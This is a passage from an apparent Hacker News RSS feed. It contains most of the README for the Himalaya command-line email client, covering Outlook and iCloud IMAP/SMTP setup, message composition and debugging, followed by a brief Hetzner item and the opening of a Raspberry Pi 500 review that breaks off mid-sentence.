message.send.backend.auth.auth-url = &quot;https://login.microsoftonline.com/common/oauth2/v2.0/authorize&quot;
message.send.backend.auth.token-url = &quot;https://login.microsoftonline.com/common/oauth2/v2.0/token&quot;
message.send.backend.auth.pkce = true
message.send.backend.auth.scopes = [&quot;https://outlook.office.com/IMAP.AccessAsUser.All&quot;, &quot;https://outlook.office.com/SMTP.Send&quot;]"><pre>[<span>accounts</span>.<span>outlook</span>]
<span>email</span> = <span><span>"</span>example@outlook.com<span>"</span></span>

<span>backend.type</span> = <span><span>"</span>imap<span>"</span></span>
<span>backend.host</span> = <span><span>"</span>outlook.office365.com<span>"</span></span>
<span>backend.port</span> = <span>993</span>
<span>backend.login</span> = <span><span>"</span>example@outlook.com<span>"</span></span>
<span>backend.auth.type</span> = <span><span>"</span>oauth2<span>"</span></span>
<span>backend.auth.client-id</span> = <span><span>"</span>*****<span>"</span></span>
<span>backend.auth.client-secret.keyring</span> = <span><span>"</span>outlook-oauth2-client-secret<span>"</span></span>
<span>backend.auth.access-token.keyring</span> = <span><span>"</span>outlook-oauth2-access-token<span>"</span></span>
<span>backend.auth.refresh-token.keyring</span> = <span><span>"</span>outlook-oauth2-refresh-token<span>"</span></span>
<span>backend.auth.auth-url</span> = <span><span>"</span>https://login.microsoftonline.com/common/oauth2/v2.0/authorize<span>"</span></span>
<span>backend.auth.token-url</span> = <span><span>"</span>https://login.microsoftonline.com/common/oauth2/v2.0/token<span>"</span></span>
<span>backend.auth.pkce</span> = <span>true</span>
<span>backend.auth.scopes</span> = [<span><span>"</span>https://outlook.office.com/IMAP.AccessAsUser.All<span>"</span></span>, <span><span>"</span>https://outlook.office.com/SMTP.Send<span>"</span></span>]

<span>message.send.backend.type</span> = <span><span>"</span>smtp<span>"</span></span>
<span>message.send.backend.host</span> = <span><span>"</span>smtp.mail.outlook.com<span>"</span></span>
<span>message.send.backend.port</span> = <span>587</span>
<span>message.send.backend.starttls</span> = <span>true</span>
<span>message.send.backend.login</span> = <span><span>"</span>example@outlook.com<span>"</span></span>
<span>message.send.backend.auth.type</span> = <span><span>"</span>oauth2<span>"</span></span>
<span>message.send.backend.auth.client-id</span> = <span><span>"</span>*****<span>"</span></span>
<span>message.send.backend.auth.client-secret.keyring</span> = <span><span>"</span>outlook-oauth2-client-secret<span>"</span></span>
<span>message.send.backend.auth.access-token.keyring</span> = <span><span>"</span>outlook-oauth2-access-token<span>"</span></span>
<span>message.send.backend.auth.refresh-token.keyring</span> = <span><span>"</span>outlook-oauth2-refresh-token<span>"</span></span>
<span>message.send.backend.auth.auth-url</span> = <span><span>"</span>https://login.microsoftonline.com/common/oauth2/v2.0/authorize<span>"</span></span>
<span>message.send.backend.auth.token-url</span> = <span><span>"</span>https://login.microsoftonline.com/common/oauth2/v2.0/token<span>"</span></span>
<span>message.send.backend.auth.pkce</span> = <span>true</span>
<span>message.send.backend.auth.scopes</span> = [<span><span>"</span>https://outlook.office.com/IMAP.AccessAsUser.All<span>"</span></span>, <span><span>"</span>https://outlook.office.com/SMTP.Send<span>"</span></span>]</pre></div>
<p dir="auto">Running <code>himalaya configure -a outlook</code> will complete your OAuth 2.0 setup and ask for your client secret.</p>
</details>
<details>
  <summary>iCloud Mail</summary>
<p dir="auto">From the <a href="https://support.apple.com/en-us/HT202304" rel="nofollow">iCloud Mail</a> support page:</p>
<ul dir="auto">
<li>IMAP port = <code>993</code>.</li>
<li>IMAP login = name of your iCloud Mail email address (for example, <code>johnappleseed</code>, not <code>johnappleseed@icloud.com</code>)</li>
<li>SMTP port = <code>587</code> with <code>STARTTLS</code></li>
<li>SMTP login = full iCloud Mail email address (for example, <code>johnappleseed@icloud.com</code>, not <code>johnappleseed</code>)</li>
</ul>
<div dir="auto" data-snippet-clipboard-copy-content="[accounts.icloud]
email = &quot;johnappleseed@icloud.com&quot;

backend.type = &quot;imap&quot;
backend.host = &quot;imap.mail.me.com&quot;
backend.port = 993
backend.login = &quot;johnappleseed&quot;
backend.auth.type = &quot;password&quot;
backend.auth.raw = &quot;*****&quot;

message.send.backend.type = &quot;smtp&quot;
message.send.backend.host = &quot;smtp.mail.me.com&quot;
message.send.backend.port = 587
message.send.backend.encryption.type = &quot;start-tls&quot;
message.send.backend.login = &quot;johnappleseed@icloud.com&quot;
message.send.backend.auth.type = &quot;password&quot;
message.send.backend.auth.raw = &quot;*****&quot;"><pre>[<span>accounts</span>.<span>icloud</span>]
<span>email</span> = <span><span>"</span>johnappleseed@icloud.com<span>"</span></span>

<span>backend.type</span> = <span><span>"</span>imap<span>"</span></span>
<span>backend.host</span> = <span><span>"</span>imap.mail.me.com<span>"</span></span>
<span>backend.port</span> = <span>993</span>
<span>backend.login</span> = <span><span>"</span>johnappleseed<span>"</span></span>
<span>backend.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>backend.auth.raw</span> = <span><span>"</span>*****<span>"</span></span>

<span>message.send.backend.type</span> = <span><span>"</span>smtp<span>"</span></span>
<span>message.send.backend.host</span> = <span><span>"</span>smtp.mail.me.com<span>"</span></span>
<span>message.send.backend.port</span> = <span>587</span>
<span>message.send.backend.encryption.type</span> = <span><span>"</span>start-tls<span>"</span></span>
<span>message.send.backend.login</span> = <span><span>"</span>johnappleseed@icloud.com<span>"</span></span>
<span>message.send.backend.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>message.send.backend.auth.raw</span> = <span><span>"</span>*****<span>"</span></span></pre></div>
<p dir="auto">Keeping your password inside the configuration file is good for testing purpose, but it is not safe. You have 2 better alternatives:</p>
<ul dir="auto">
<li>
<p dir="auto">Save your password in any password manager that can be queried via the CLI:</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.cmd = &quot;pass show icloud&quot;"><pre><span>backend.auth.cmd</span> = <span><span>"</span>pass show icloud<span>"</span></span></pre></div>
</li>
<li>
<p dir="auto">Use the global keyring of your system (requires the <code>keyring</code> cargo feature):</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.keyring = &quot;icloud-example&quot;"><pre><span>backend.auth.keyring</span> = <span><span>"</span>icloud-example<span>"</span></span></pre></div>
<p dir="auto">Running <code>himalaya configure -a icloud</code> will ask for your IMAP password, just paste the one generated previously.</p>
</li>
</ul>
</details>
<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<details>
  <summary>How to compose a message?</summary>
<p dir="auto">An email message is a list of <strong>headers</strong> (<code>key: val</code>) followed by a <strong>body</strong>. They form together a template:</p>
<div dir="auto" data-snippet-clipboard-copy-content="Header: value
Header: value
Header: value

Body"><pre><span>Header</span>: value
<span>Header</span>: value
<span>Header</span>: value

Body</pre></div>
<p dir="auto"><em><strong>Headers and body must be separated by an empty line.</strong></em></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Headers</h3><a id="user-content-headers" aria-label="Permalink: Headers" href="#headers"></a></p>
<p dir="auto">Here a non-exhaustive list of valid email message template headers:</p>
<ul dir="auto">
<li><code>Message-ID</code>: represents the message identifier (you usually do not need to set up it manually)</li>
<li><code>In-Reply-To</code>: represents the identifier of the replied message</li>
<li><code>Date</code>: represents the date of the message</li>
<li><code>Subject</code>: represents the subject of the message</li>
<li><code>From</code>: represents the address of the sender</li>
<li><code>To</code>: represents the addresses of the receivers</li>
<li><code>Reply-To</code>: represents the address the receiver should reply to instead of the <code>From</code> header</li>
<li><code>Cc</code>: represents the addresses of the other receivers (carbon copy)</li>
<li><code>Bcc</code>: represents the addresses of the other hidden receivers (blind carbon copy)</li>
</ul>
<p dir="auto">An address can be:</p>
<ul dir="auto">
<li>a single email address <code>user@domain</code></li>
<li>a named address <code>Name &lt;user@domain&gt;</code></li>
<li>a quoted named address <code>"Name" &lt;user@domain&gt;</code></li>
</ul>
<p dir="auto">Multiple address are separated by a coma <code>,</code>: <code>user@domain, Name &lt;user@domain&gt;, "Name" &lt;user@domain&gt;</code>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Plain text body</h3><a id="user-content-plain-text-body" aria-label="Permalink: Plain text body" href="#plain-text-body"></a></p>
<p dir="auto">Email message template body can be written in plain text. The result will be compiled into a single <code>text/plain</code> MIME part:</p>
<div dir="auto" data-snippet-clipboard-copy-content="From: alice@localhost
To: Bob <bob@localhost>
Subject: Hello from Himalaya

Hello, world!"><pre><span>From</span>: <span>alice@localhost</span>
<span>To</span>: <span>Bob</span> &lt;<span>bob@localhost</span>&gt;
<span>Subject</span>: Hello from Himalaya

Hello, world!</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">MML boby</h3><a id="user-content-mml-boby" aria-label="Permalink: MML boby" href="#mml-boby"></a></p>
<p dir="auto">Email message template body can also be written in MML. The MIME Meta Language was introduced by the Emacs <a href="https://www.gnu.org/software/emacs/manual/html_node/emacs-mime/Composing.html" rel="nofollow"><code>mml</code></a> ELisp module. Pimalaya <a href="https://github.com/pimalaya/core/tree/master/mml">ported it</a> in Rust.</p>
<p dir="auto">A raw email message is structured according to the <a href="https://www.rfc-editor.org/rfc/rfc2045" rel="nofollow">MIME</a> standard. This standard produces verbose, non-friendly messages. Here comes MML: it simplifies the way email message body are structured. Thanks to its simple XML-based syntax, it allows you to easily add multiple parts, attach a binary file, or attach inline image to your body without dealing with the MIME standard.</p>
<p dir="auto">For instance, this MML template:</p>
<div dir="auto" data-snippet-clipboard-copy-content="From: alice@localhost
To: bob@localhost
Subject: MML simple

<#multipart type=alternative>
This is a plain text part.
<#part type=text/enriched>
<center>This is a centered enriched part</center>
<#/multipart>"><pre><span>From</span>: <span>alice@localhost</span>
<span>To</span>: <span>bob@localhost</span>
<span>Subject</span>: MML simple

&lt;#multipart type=alternative&gt;
This is a plain text part.
&lt;#part type=<span>text/enriched&gt;</span>
&lt;center&gt;This is a centered enriched part&lt;/center&gt;
&lt;#/multipart&gt;</pre></div>
<p dir="auto">compiles into the following MIME Message:</p>
<div dir="auto" data-snippet-clipboard-copy-content="Subject: MML simple
To: bob@localhost
From: alice@localhost
MIME-Version: 1.0
Date: Tue, 29 Nov 2022 13:07:01 +0000
Content-Type: multipart/alternative;
 boundary=&quot;4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe&quot;

--4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit

This is a plain text part.
--4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe
Content-Type: text/enriched
Content-Transfer-Encoding: 7bit

<center>This is a centered enriched part</center>
--4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe--"><pre><span>Subject</span>: MML simple
<span>To</span>: <span>bob@localhost</span>
<span>From</span>: <span>alice@localhost</span>
<span>MIME-Version</span>: 1.0
<span>Date</span>: Tue, 29 Nov 2022 13:07:01 +0000
<span>Content-Type</span>: multipart/alternative;
 <span>boundary="4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe"</span>

<span>--4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe</span>
<span>Content-Type</span>: <span>text/plain; charset=utf-8</span><span></span>
<span><span>Content-Transfer-Encoding</span>: 7bit</span>
<span></span>
<span>This is a plain text part.</span>
<span></span><span>--4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe</span>
<span>Content-Type</span>: <span>text/enriched</span><span></span>
<span><span>Content-Transfer-Encoding</span>: 7bit</span>
<span></span>
<span>&lt;center&gt;This is a centered enriched part&lt;/center&gt;</span>
<span></span><span>--4CV1Cnp7mXkDyvb55i77DcNSkKzB8HJzaIT84qZe--</span></pre></div>
<p dir="auto"><em>See more examples at <a href="https://github.com/pimalaya/core/tree/master/mml/examples">pimalaya/core/mml</a>.</em></p>
</details>
<details>
  <summary>How to add attachments to a message?</summary>
<p dir="auto"><em>Read first about the FAQ: How to compose a message?</em>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="From: alice@localhost
To: bob@localhost
Subject: How to attach stuff

Regular binary attachment:
<#part filename=/path/to/file.pdf><#/part>

Custom file name:
<#part filename=/path/to/file.pdf name=custom.pdf><#/part>

Inline image:
<#part disposition=inline filename=/path/to/image.png><#/part>"><pre><span>From</span>: <span>alice@localhost</span>
<span>To</span>: <span>bob@localhost</span>
<span>Subject</span>: How to attach stuff

Regular binary attachment:
&lt;#part filename=/path/to/file.pdf&gt;&lt;#/part&gt;

Custom file name:
&lt;#part filename=/path/to/file.pdf name=custom.pdf&gt;&lt;#/part&gt;

Inline image:
&lt;#part disposition=inline filename=/path/to/image.png&gt;&lt;#/part&gt;</pre></div>
<p dir="auto"><em>See more examples at <a href="https://github.com/pimalaya/core/tree/master/mml/examples">pimalaya/core/mml</a>.</em></p>
</details>
<details>
  <summary>How to debug Himalaya CLI?</summary>
<p dir="auto">The simplest way is to use <code>--debug</code> and <code>--trace</code> arguments.</p>
<p dir="auto">The advanced way is based on environment variables:</p>
<ul dir="auto">
<li><code>RUST_LOG=&lt;level&gt;</code>: determines the log level filter, can be one of <code>off</code>, <code>error</code>, <code>warn</code>, <code>info</code>, <code>debug</code> and <code>trace</code>.</li>
<li><code>RUST_SPANTRACE=1</code>: enables the spantrace (a span represent periods of time in which a program was executing in a particular context).</li>
<li><code>RUST_BACKTRACE=1</code>: enables the error backtrace.</li>
<li><code>RUST_BACKTRACE=full</code>: enables the full error backtrace, which include source lines where the error originated from.</li>
</ul>
<p dir="auto">Logs are written to the <code>stderr</code>, which means that you can redirect them easily to a file:</p>
<div data-snippet-clipboard-copy-content="RUST_LOG=debug himalaya 2>/tmp/himalaya.log"><pre><code>RUST_LOG=debug himalaya 2&gt;/tmp/himalaya.log
</code></pre></div>
</details>
<details>
  <summary>How the wizard discovers IMAP/SMTP configs?</summary>
<p dir="auto">All the lookup mechanisms use the email address domain as base for the lookup. It is heavily inspired from the Thunderbird <a href="https://udn.realityripple.com/docs/Mozilla/Thunderbird/Autoconfiguration" rel="nofollow">Autoconfiguration</a> protocol. For example, for the email address <code>test@example.com</code>, the lookup is performed as (in this order):</p>
<ol dir="auto">
<li>check for <code>autoconfig.example.com</code></li>
<li>look up of <code>example.com</code> in the ISPDB (the Thunderbird central database)</li>
<li>look up <code>MX example.com</code> in DNS, and for <code>mx1.mail.hoster.com</code>, look up <code>hoster.com</code> in the ISPDB</li>
<li>look up <code>SRV example.com</code> in DNS</li>
<li>try to guess (<code>imap.example.com</code>, <code>smtp.example.com</code>…)</li>
</ol>
</details>
<p dir="auto"><h2 tabindex="-1" dir="auto">Sponsoring</h2><a id="user-content-sponsoring" aria-label="Permalink: Sponsoring" href="#sponsoring"></a></p>
<p dir="auto"><a href="https://nlnet.nl/" rel="nofollow"><img src="https://camo.githubusercontent.com/4d91d9847b6dbe6f148c22ea1e4938dcf47f66e21c72b89e48a37191b26a9275/68747470733a2f2f6e6c6e65742e6e6c2f6c6f676f2f62616e6e65722d3136307836302e706e67" alt="nlnet" data-canonical-src="https://nlnet.nl/logo/banner-160x60.png"></a></p>
<p dir="auto">Special thanks to the <a href="https://nlnet.nl/" rel="nofollow">NLnet foundation</a> and the <a href="https://www.ngi.eu/" rel="nofollow">European Commission</a> that helped the project to receive financial support from various programs:</p>
<ul dir="auto">
<li><a href="https://nlnet.nl/project/Himalaya/" rel="nofollow">NGI Assure</a> in 2022</li>
<li><a href="https://nlnet.nl/project/Pimalaya/" rel="nofollow">NGI Zero Entrust</a> in 2023</li>
<li><a href="https://nlnet.nl/project/Pimalaya-PIM/" rel="nofollow">NGI Zero Core</a> in 2024 <em>(still ongoing)</em></li>
</ul>
<p dir="auto">If you appreciate the project, feel free to donate using one of the following providers:</p>
<p dir="auto"><a href="https://github.com/sponsors/soywod"><img src="https://camo.githubusercontent.com/26875d95008e3343224591d9f92c61c0da12b2c38e40adfd20da0e6e38b45a41/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d47697448756225323053706f6e736f72732d6661666266633f6c6f676f3d47697448756225323053706f6e736f7273" alt="GitHub" data-canonical-src="https://img.shields.io/badge/-GitHub%20Sponsors-fafbfc?logo=GitHub%20Sponsors"></a>
<a href="https://ko-fi.com/soywod" rel="nofollow"><img src="https://camo.githubusercontent.com/113223c4bd38bf58a2e544cc29a899257a0a8fc8656a795bf0206b9074832bff/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d4b6f2d2d66692d6666356535613f6c6f676f3d4b6f2d6669266c6f676f436f6c6f723d666666666666" alt="Ko-fi" data-canonical-src="https://img.shields.io/badge/-Ko--fi-ff5e5a?logo=Ko-fi&amp;logoColor=ffffff"></a>
<a href="https://www.buymeacoffee.com/soywod" rel="nofollow"><img src="https://camo.githubusercontent.com/9e710fc5db5f0d5a0db813096950413f680282e1a8e0ae913cc231ffd668c435/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d4275792532304d6525323061253230436f666665652d6666646430303f6c6f676f3d4275792532304d6525323041253230436f66666565266c6f676f436f6c6f723d303030303030" alt="Buy Me a Coffee" data-canonical-src="https://img.shields.io/badge/-Buy%20Me%20a%20Coffee-ffdd00?logo=Buy%20Me%20A%20Coffee&amp;logoColor=000000"></a>
<a href="https://liberapay.com/soywod" rel="nofollow"><img src="https://camo.githubusercontent.com/a31dbb9afc8262a914c147cb006734e532cc4bd3d22db14866631b670e711e8f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d4c69626572617061792d6636633931353f6c6f676f3d4c6962657261706179266c6f676f436f6c6f723d323232323232" alt="Liberapay" data-canonical-src="https://img.shields.io/badge/-Liberapay-f6c915?logo=Liberapay&amp;logoColor=222222"></a>
<a href="https://thanks.dev/soywod" rel="nofollow"><img src="https://camo.githubusercontent.com/e6af9d08c153c8ca26b68405c44f9f01444965f3f7ad0f9ed5d929aa42f66acd/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d7468616e6b732e6465762d3030303030303f6c6f676f3d646174613a696d6167652f7376672b786d6c3b6261736536342c50484e325a79423361575230614430694d6a51754d446b334969426f5a576c6e61485139496a45334c6a55354e7949675932786863334d39496e63744d7a5967625777744d6942735a7a70746543307749484279615735304f6d31344c54416763484a70626e5136615735325a584a304969423462577875637a30696148523063446f764c336433647935334d793576636d63764d6a41774d43397a646d6369506a78775958526f49475139496b30354c6a63344d7941784e7934314f5464494e79347a4f54686a4c5445754d545934494441744d6934774f5449744c6a49354e7930794c6a63334d7930754f446b744c6a59344c5334314f544d744d5334774d6930784c6a51324d6930784c6a41794c5449754e6a4132646930784c6a4d304e6d4d774c5445754d4445344c5334794d6a63744d5334334e5330754e6a63344c5449754d546b314c5334304e5449744c6a51304e6930784c6a497a4d6930754e6a59354c5449754d7a51744c6a59324f556777566a63754e7a4131614334314f44646a4d5334784d4467674d4341784c6a67344f4330754d6a4979494449754d7a51744c6a59324f4334304e5445744c6a51304e6934324e7a63744d5334784e7a63754e6a63334c5449754d546b31566a4d754e446b32597a41744d5334784e4451754d7a51744d6934774d544d674d5334774d6a45744d6934324d445a444e53347a4d4455754d6a6b33494459754d6a4d674d4341334c6a4d354f434177614449754d7a6731646a45754f546733614330754f546731597930754d7a5978494441744c6a59344f4334774d6a63744c6a6b344c6a41344d6d45784c6a63784f5341784c6a63784f534177494441674d4330754e7a4d324c6a4d774e324d744c6a49774e5334784e5459744c6a4d314f43347a4f4451744c6a51324c6a59344d6930754d54417a4c6a49354f4330754d5455304c6a59344d6930754d545530494445754d545578566a55754d6a4e6a4d4341754f4459334c5334794e446b674d5334314f4459744c6a63304e5341794c6a45314e5330754e446b334c6a55324f5330784c6a45314f4341784c6a41774e4330784c6a6b344d7941784c6a4d774e5859754d6a4533597934344d6a55754d7941784c6a51344e6934334d7a59674d5334354f444d674d53347a4d4455754e446b324c6a55334c6a63304e5341784c6a49344e7934334e4455674d6934784e5452324d5334774d6a466a4d4341754e4463754d4455784c6a67314e4334784e544d674d5334784e5449754d54417a4c6a49354f4334794e5459754e5449314c6a51324d5334324f4449754d546b7a4c6a45314e7934304d7a63754d6a59754e7a4d794c6a4d784d6934794f5455754d4455754e6a497a4c6a41334e6934354f4451754d446332614334354f445661625445304c6a4d784e4330334c6a63774e6d67744c6a55344f474d744d5334784d4467674d4330784c6a67344f4334794d6a4d744d69347a4e4334324e6a6b744c6a51314c6a51304e5330754e6a6333494445754d5463334c5334324e7a63674d6934784f5456574d5451754d574d77494445754d5451304c53347a4e4341794c6a41784d7930784c6a4179494449754e6a41324c5334324f4334314f544d744d5334324d4455754f446b744d6934334e7a51754f446c6f4c5449754d7a6730646930784c6a6b344f4767754f5467305979347a4e6a49674d4341754e6a67344c5334774d6a63754f5467744c6a41344c6a49354d6930754d4455314c6a557a4f4330754d5455334c6a637a4e7930754d7a41344c6a49774e4330754d5455334c6a4d314f4330754d7a67304c6a51324c5334324f4449754d54417a4c5334794f5467754d5455304c5334324f4449754d5455304c5445754d545579646930784c6a4179597a41744c6a67324f4334794e4467744d5334314f4459754e7a51314c5449754d5455314c6a51354e7930754e5463674d5334784e5467744d5334774d4451674d5334354f444d744d53347a4d4456324c5334794d54646a4c5334344d6a55744c6a4d774d5330784c6a51344e6930754e7a4d324c5445754f54677a4c5445754d7a41314c5334304f5463744c6a55334c5334334e4455744d5334794f4467744c6a63304e5330794c6a45314e5859744d5334774d6d4d774c5334304e7930754d4455784c5334344e5451744c6a45314e4330784c6a45314d6930754d5441794c5334794f5467744c6a49314e6930754e5449324c5334304e6930754e6a6779595445754e7a4535494445754e7a4535494441674d4341774c5334334d7a63744c6a4d774e7941314c6a4d354e5341314c6a4d354e534177494441674d4330754f5467744c6a41344d6d67744c6a6b344e465977614449754d7a6730597a45754d545935494441674d6934774f544d754d6a6b33494449754e7a63304c6a67354c6a59344c6a55354d7941784c6a4179494445754e445979494445754d4449674d6934324d445a324d53347a4e445a6a4d4341784c6a41784f4334794d6a59674d5334334e5334324e7a67674d6934784f5455754e4455784c6a51304e6941784c6a497a4d5334324e6a67674d69347a4e4334324e6a686f4c6a55344e336f6949475a706247773949694e6d5a6d59694c7a34384c334e325a7a343d" alt="thanks.dev" data-canonical-src="https://img.shields.io/badge/-thanks.dev-000000?logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQuMDk3IiBoZWlnaHQ9IjE3LjU5NyIgY2xhc3M9InctMzYgbWwtMiBsZzpteC0wIHByaW50Om14LTAgcHJpbnQ6aW52ZXJ0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik05Ljc4MyAxNy41OTdINy4zOThjLTEuMTY4IDAtMi4wOTItLjI5Ny0yLjc3My0uODktLjY4LS41OTMtMS4wMi0xLjQ2Mi0xLjAyLTIuNjA2di0xLjM0NmMwLTEuMDE4LS4yMjctMS43NS0uNjc4LTIuMTk1LS40NTItLjQ0Ni0xLjIzMi0uNjY5LTIuMzQtLjY2OUgwVjcuNzA1aC41ODdjMS4xMDggMCAxLjg4OC0uMjIyIDIuMzQtLjY2OC40NTEtLjQ0Ni42NzctMS4xNzcuNjc3LTIuMTk1VjMuNDk2YzAtMS4xNDQuMzQtMi4wMTMgMS4wMjEtMi42MDZDNS4zMDUuMjk3IDYuMjMgMCA3LjM5OCAwaDIuMzg1djEuOTg3aC0uOTg1Yy0uMzYxIDAtLjY4OC4wMjctLjk4LjA4MmExLjcxOSAxLjcxOSAwIDAgMC0uNzM2LjMwN2MtLjIwNS4xNTYtLjM1OC4zODQtLjQ2LjY4Mi0uMTAzLjI5OC0uMTU0LjY4Mi0uMTU0IDEuMTUxVjUuMjNjMCAuODY3LS4yNDkgMS41ODYtLjc0NSAyLjE1NS0uNDk3LjU2OS0xLjE1OCAxLjAwNC0xLjk4MyAxLjMwNXYuMjE3Yy44MjUuMyAxLjQ4Ni43MzYgMS45ODMgMS4zMDUuNDk2LjU3Ljc0NSAxLjI4Ny43NDUgMi4xNTR2MS4wMjFjMCAuNDcuMDUxLjg1NC4xNTMgMS4xNTIuMTAzLjI5OC4yNTYuNTI1LjQ2MS42ODIuMTkzLjE1Ny40MzcuMjYuNzMyLjMxMi4yOTUuMDUuNjIzLjA3Ni45ODQuMDc2aC45ODVabTE0LjMxNC03LjcwNmgtLjU4OGMtMS4xMDggMC0xLjg4OC4yMjMtMi4zNC42NjktLjQ1LjQ0NS0uNjc3IDEuMTc3LS42NzcgMi4xOTVWMTQuMWMwIDEuMTQ0LS4zNCAyLjAxMy0xLjAyIDIuNjA2LS42OC41OTMtMS42MDUuODktMi43NzQuODloLTIuMzg0di0xLjk4OGguOTg0Yy4zNjIgMCAuNjg4LS4wMjcuOTgtLjA4LjI5Mi0uMDU1LjUzOC0uMTU3LjczNy0uMzA4LjIwNC0uMTU3LjM1OC0uMzg0LjQ2LS42ODIuMTAzLS4yOTguMTU0LS42ODIuMTU0LTEuMTUydi0xLjAyYzAtLjg2OC4yNDgtMS41ODYuNzQ1LTIuMTU1LjQ5Ny0uNTcgMS4xNTgtMS4wMDQgMS45ODMtMS4zMDV2LS4yMTdjLS44MjUtLjMwMS0xLjQ4Ni0uNzM2LTEuOTgzLTEuMzA1LS40OTctLjU3LS43NDUtMS4yODgtLjc0NS0yLjE1NXYtMS4wMmMwLS40Ny0uMDUxLS44NTQtLjE1NC0xLjE1Mi0uMTAyLS4yOTgtLjI1Ni0uNTI2LS40Ni0uNjgyYTEuNzE5IDEuNzE5IDAgMCAwLS43MzctLjMwNyA1LjM5NSA1LjM5NSAwIDAgMC0uOTgtLjA4MmgtLjk4NFYwaDIuMzg0YzEuMTY5IDAgMi4wOTMuMjk3IDIuNzc0Ljg5LjY4LjU5MyAxLjAyIDEuNDYyIDEuMDIgMi42MDZ2MS4zNDZjMCAxLjAxOC4yMjYgMS43NS42NzggMi4xOTUuNDUxLjQ0NiAxLjIzMS42NjggMi4zNC42NjhoLjU4N3oiIGZpbGw9IiNmZmYiLz48L3N2Zz4="></a>
<a href="https://www.paypal.com/paypalme/soywod" rel="nofollow"><img src="https://camo.githubusercontent.com/3c40c65d34bdc316dcc94219c1ea34b4f2c4f5f47f1d40618886316dfe3c75ef/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2d50617950616c2d3030373963313f6c6f676f3d50617950616c266c6f676f436f6c6f723d666666666666" alt="PayPal" data-canonical-src="https://img.shields.io/badge/-PayPal-0079c1?logo=PayPal&amp;logoColor=ffffff"></a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA["Hetzner has decided to cancel our account and terminate all servers." (360 pts)]]></title>
            <link>https://mastodon.social/@kiwix/113622081750449356</link>
            <guid>42365295</guid>
            <pubDate>Mon, 09 Dec 2024 11:48:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mastodon.social/@kiwix/113622081750449356">https://mastodon.social/@kiwix/113622081750449356</a>, See on <a href="https://news.ycombinator.com/item?id=42365295">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[Raspberry Pi 500 Review: The keyboard is the computer, again (121 pts)]]></title>
            <link>https://www.tomshardware.com/raspberry-pi/raspberry-pi-500-review</link>
            <guid>42364038</guid>
            <pubDate>Mon, 09 Dec 2024 08:21:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tomshardware.com/raspberry-pi/raspberry-pi-500-review">https://www.tomshardware.com/raspberry-pi/raspberry-pi-500-review</a>, See on <a href="https://news.ycombinator.com/item?id=42364038">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-widget-type="contentparsed" id="widgetArea16">

<section>
<div>
<div>
<h3>
Tom's Hardware Verdict
</h3>
</div>
<p>A superb update to the Raspberry Pi 400, we get the power of the Raspberry Pi 5 in a convenient form. Thermal performance is excellent, and we easily overclocked it to 3 GHz.</p>
<div>
<h4>
Pros
</h4>
<ul>
<li><span>+</span><p>Awesome thermal performance</p></li>
<li><span>+</span><p>Convenient form factor</p></li>
<li><span>+</span><p>Fast, and can be made faster!</p></li>
</ul>
</div>
<div>
<h4>
Cons
</h4>
<ul>
<li><span>-</span><p>GPIO access is awkward</p></li>
<li><span>-</span><p>Lack of NVMe storage</p></li>
<li><span>-</span><p>No camera or Touch Display connections</p></li>
</ul>
</div>
</div>
<section id="slice-container-how-we-test-review-UsUMufRUcy86LXgPtqnAz4"><p><span data-test="how-we-test__title">Why you can trust Tom's Hardware <svg viewBox="0 0 10 10" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
    <path d="M5 10a5.006 5.006 0 0 1-5-5v-.1A5 5 0 1 1 5 10ZM2.705 4.795 2 5.5l2 2 4-4-.705-.71L4 6.085l-1.295-1.29Z"></path>
</svg>
 </span><span data-test="how-we-test__description">Our expert reviewers spend hours testing and comparing products and services so you can choose the best for you. <a href="https://www.tomshardware.com/news/how-we-test" data-before-rewrite-localise="https://www.tomshardware.com/news/how-we-test">Find out more about how we test</a>.</span></p></section>

<div id="article-body">
<p>When the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/news/raspberry-pi-400-review-faster-cpu-new-layout-better-thermals" data-before-rewrite-localise="https://www.tomshardware.com/news/raspberry-pi-400-review-faster-cpu-new-layout-better-thermals"><u>Raspberry Pi 400</u></a> was released, the world was deeply in the grip of COVID19 and chip shortages meant that stocks of common electronics were in short supply. Including the <a data-analytics-id="inline-link" href="https://www.tomshardware.com/reviews/raspberry-pi-4" data-before-rewrite-localise="https://www.tomshardware.com/reviews/raspberry-pi-4"><u>Raspberry Pi 4</u></a>. The Raspberry Pi 400 introduced a new form factor to the Raspberry Pi range, a computer “in a keyboard.”</p><p>A computer in a keyboard wasn’t a new idea. As a kid in the 1980s, I had various Commodore machines, so I was well versed in keyboards that were computers. But for the Raspberry Pi 400 this was a 